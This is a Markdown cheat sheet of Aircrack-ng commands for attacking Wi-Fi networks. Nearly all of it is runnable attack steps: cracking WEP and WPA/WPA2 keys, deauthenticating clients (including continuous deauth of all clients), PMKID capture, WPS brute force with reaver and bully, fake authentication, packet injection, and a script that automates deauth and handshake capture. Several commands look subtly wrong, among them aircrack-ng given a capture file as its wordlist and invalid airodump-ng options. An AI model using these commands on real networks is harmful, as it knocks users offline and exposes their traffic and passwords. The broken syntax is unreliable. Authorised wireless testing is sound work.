# Aircrack-ng - Wireless Security Suite

## Overview
Aircrack-ng is a complete suite of tools for WiFi security assessment including:
- Packet capture
- WEP/WPA/WPA2 cracking
- Access point detection
- Deauthentication attacks
- Wireless network analysis
- Packet injection

## Basic Components

### Aircrack-ng Suite
```bash
# Main tools in the suite:
# airmon-ng - Monitor mode manager
# airodump-ng - Packet capture
# aireplay-ng - Packet injection and attacks
# aircrack-ng - Password cracking
# airdecap-ng - Decrypt captured files
# airtun-ng - Virtual tunnel creation
```

### Monitor Mode Setup
```bash
# Check available wireless interfaces
iwconfig
ip link show

# Start monitor mode
sudo airmon-ng start wlan0

# Check monitor mode interface
iwconfig

# Stop monitor mode
sudo airmon-ng stop wlan0mon
```

## Network Discovery

### Scan for Networks
```bash
# Scan for all networks
sudo airodump-ng wlan0mon

# Scan on specific channel
sudo airodump-ng --channel 6 wlan0mon

# Scan with filtering
sudo airodump-ng --encrypt wpa2 wlan0mon

# Scan with output file
sudo airodump-ng -o scan_results.csv wlan0mon
```

### Target Specific Network
```bash
# Monitor specific BSSID
sudo airodump-ng --bssid 00:11:22:33:44:55 wlan0mon

# Monitor on specific channel
sudo airodump-ng --channel 6 --bssid 00:11:22:33:44:55 wlan0mon

# Save capture to file
sudo airodump-ng -w capture -c 6 --bssid 00:11:22:33:44:55 wlan0mon
```

## WEP Cracking

### Capture Packets
```bash
# Start capture on target
sudo airodump-ng -w wep_capture -c 6 --bssid 00:11:22:33:44:55 wlan0mon

# Start injection (separate terminal)
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0mon

# Capture ARP requests
sudo aireplay-ng -3 -b 00:11:22:33:44:55 wlan0mon
```

### Crack WEP Key
```bash
# Start cracking with captured packets
sudo aircrack-ng -w wep_capture-01.cap

# Cracking with multiple files
sudo aircrack-ng wep_capture*.cap

# Specify BSSID
sudo aircrack-ng -b 00:11:22:33:44:55 wep_capture*.cap
```

## WPA/WPA2 Handshake Capture

### Capture Handshake
```bash
# Monitor target network
sudo airodump-ng -w wpa_capture -c 6 --bssid 00:11:22:33:44:55 wlan0mon

# Wait for handshake or force deauth
# In another terminal:
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

### Deauthentication Attack
```bash
# Deauth specific client
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Deauth all clients
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

# Continuous deauth
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon
```

### WPA/WPA2 Cracking
```bash
# Basic dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# Specify BSSID
sudo aircrack-ng -b 00:11:22:33:44:55 -w wordlist.txt wpa_capture*.cap

# Use multiple wordlists
sudo aircrack-ng -w wordlist1.txt -w wordlist2.txt wpa_capture*.cap
```

## Advanced WPA Attacks

### PMKID Attack
```bash
# Capture PMKID (no clients needed)
sudo airodump-ng -p pmkid -b 00:11:22:33:44:55 wlan0mon

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 -E pmkid.22000 capture.cap

# Attack with hashcat
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

### WPS Attacks
```bash
# Identify WPS-enabled networks
sudo wash -i wlan0mon

# Reaver attack
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

# Bully attack (alternative)
sudo bully -b 00:11:22:33:44:55 -i wlan0mon -c 6 -v 3
```

## Packet Injection

### Test Injection
```bash
# Test injection capabilities
sudo aireplay-ng -9 wlan0mon

# Test against specific AP
sudo aireplay-ng -9 -e "NetworkName" wlan0mon
```

### ARP Injection
```bash
# ARP request replay
sudo aireplay-ng -3 -b 00:11:22:33:44:55 wlan0mon

# Interactive packet replay
sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:11:22:33:44:55 wlan0mon
```

### Fake Authentication
```bash
# Fake authentication
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0mon

# Fake with specific MAC
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
```

## WPA3 Security Testing

### WPA3 Discovery
```bash
# Check for WPA3 networks
sudo airodump-ng wlan0mon | grep "WPA3"

# Identify SAE (Simultaneous Authentication of Equals)
airodump-ng output will show WPA3 or WPA3-SAE

# Monitor WPA3 handshake (different from WPA2)
sudo airodump-ng -w wpa3_capture -c 6 --bssid 00:11:22:33:44:55 wlan0mon
```

## Analysis and Decryption

### Decrypt Captured Files
```bash
# Decrypt WEP traffic
sudo airdecap-ng -w wep_key wep_capture.cap

# Decrypt WPA traffic
sudo airdecap-ng -e "NetworkName" -p passphrase wpa_capture.cap

# Extract handshake only
aircrack-ng wpa_capture.cap -J wpa_handshake
```

### Packet Analysis
```bash
# View capture details
tcpdump -r capture.cap

# Filter by BSSID
tcpdump -r capture.cap ether host 00:11:22:33:44:55

# View only EAPOL packets
tcpdump -r capture.cap -e 'ether proto 0x888e'
```

## Automation Scripts

### Automated Handshake Capture
```bash
#!/bin/bash
# Automated WPA handshake capture

INTERFACE="wlan0mon"
BSSID="00:11:22:33:44:55"
CHANNEL="6"
OUTPUT="handshake_capture"

# Start monitor mode
sudo airmon-ng start wlan0

# Start capture
sudo airodump-ng -w $OUTPUT -c $CHANNEL --bssid $BSSID $INTERFACE &
AIRODUMP_PID=$!

# Wait 10 seconds
sleep 10

# Send deauth packets
sudo aireplay-ng -0 5 -a $BSSID $INTERFACE

# Wait for handshake
sleep 30

# Kill airodump
kill $AIRODUMP_PID

# Check for handshake
if aircrack-ng $OUTPUT-01.cap | grep -q "Handshake"; then
    echo "Handshake captured!"
else
    echo "Handshake not captured"
fi
```

### Network Scanner
```bash
#!/bin/bash
# WiFi network scanner

INTERFACE="wlan0mon"
OUTPUT="network_scan"

echo "Scanning for networks..."
sudo airodump-ng -w $OUTPUT $INTERFACE &
SCAN_PID=$!

# Scan for 30 seconds
sleep 30

# Kill scan
kill $SCAN_PID

# Parse results
echo "Discovered networks:"
grep -E "Station MAC|BSSID" $OUTPUT-01.csv | tail -n +2
```

## Security Testing Workflow

### Complete WPA2 Assessment
```bash
# 1. Setup monitor mode
sudo airmon-ng start wlan0
sudo airmon-ng check kill

# 2. Discover networks
sudo airodump-ng wlan0mon

# 3. Target specific network
sudo airodump-ng -w target_capture -c 6 --bssid 00:11:22:33:44:55 wlan0mon

# 4. Capture handshake
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack handshake
sudo aircrack-ng -w wordlist.txt target_capture-01.cap

# 6. Clean up
sudo airmon-ng stop wlan0mon
```

## Troubleshooting

### Common Issues
```bash
# Interface not found
# Check if wireless card supports monitor mode
iw list | grep -A 5 "Supported interface modes"

# Monitor mode not working
# Kill conflicting processes
sudo airmon-ng check kill

# No packets captured
# Check channel and BSSID
sudo airodump-ng wlan0mon

# Injection not working
# Test injection capabilities
sudo aireplay-ng -9 wlan0mon
```

### Performance Issues
```bash
# Low capture rate
# Check driver and firmware
lsusb
lspci | grep -i wireless

# Interference
# Change channel
sudo iwconfig wlan0mon channel 6
```

## Tips
- Always check for monitor mode support before starting
- Kill conflicting processes with airmon-ng check kill
- Use strong wordlists for WPA/WPA2 cracking
- Capture handshakes for offline cracking
- Be patient - some attacks take time
- Test in controlled environments only
- Keep wireless drivers updated
- Use external USB adapters for better performance
- Document network parameters during testing
- Consider legal implications before any testing